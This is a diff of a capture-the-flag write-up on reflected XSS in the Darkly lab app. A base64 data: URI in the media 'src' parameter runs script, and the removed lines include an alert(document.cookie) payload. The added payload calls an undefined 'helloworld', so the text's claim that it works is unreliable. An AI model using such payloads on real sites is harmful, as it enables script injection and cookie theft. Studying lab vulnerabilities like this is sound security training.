@@ -1,17 +1,16 @@
 # Media `src` Data URI Injection
 
-This flag was found through an XSS vulnerability in the media handler of the Darkly web application.
-
-The vulnerable URL was:
+This flag was found through an XSS vulnerability in the media handler,
+The vulnerable URL was File: nsa_prism.jpg:
 
 ```txt
-http://192.168.56.101/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+http://192.168.56.101/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChoZWxsb3dvcmxkKTwvc2NyaXB0Pg==
 ```
 
 The payload is a Base64-encoded HTML document containing:
 
 ```html
-<script>alert(1)</script>
+<script>alert(helloworld)</script> ==> PHNjcmlwdD5hbGVydChoZWxsb3dvcmxkKTwvc2NyaXB0Pg==
 ```
 
 When the payload was passed through the `src` parameter, the browser executed the JavaScript. This showed that the application was taking user-controlled input from `src` and placing it into an HTML `<object>` resource context without proper validation.
@@ -21,7 +20,7 @@ When the payload was passed through the `src` parameter, the browser executed th
 Testing XSS in normal input fields using a classic payload:
 
 ```html
-<script>alert(document.cookie)</script>
+<script>alert(helloworld)</script>
 ```
 
 That payload worked and revealed:
@@ -68,35 +67,12 @@ The page should only load approved media resources, but it accepts a value that 
 The working payload was:
 
 ```txt
-data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5hbGVydChoZWxsb3dvcmxkKTwvc2NyaXB0Pg==
 ```
 
 This is a `data:` URI.
 
-A `data:` URI allows content to be embedded directly inside a URL. In this case, the content type is:
-
-```txt
-text/html
-```
-
-The Base64 part is:
-
-```txt
-PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-```
-
-Decoded, it becomes:
-
-```html
-<script>alert(1)</script>
-```
-
-So the full meaning is:
-
-```txt
-Load this inline HTML document, then execute its script.
-```
-
+A `data:` URI allows content to be embedded directly inside a URL.
 Because the application placed this value inside a media source context, the browser treated it as active content.
 
 
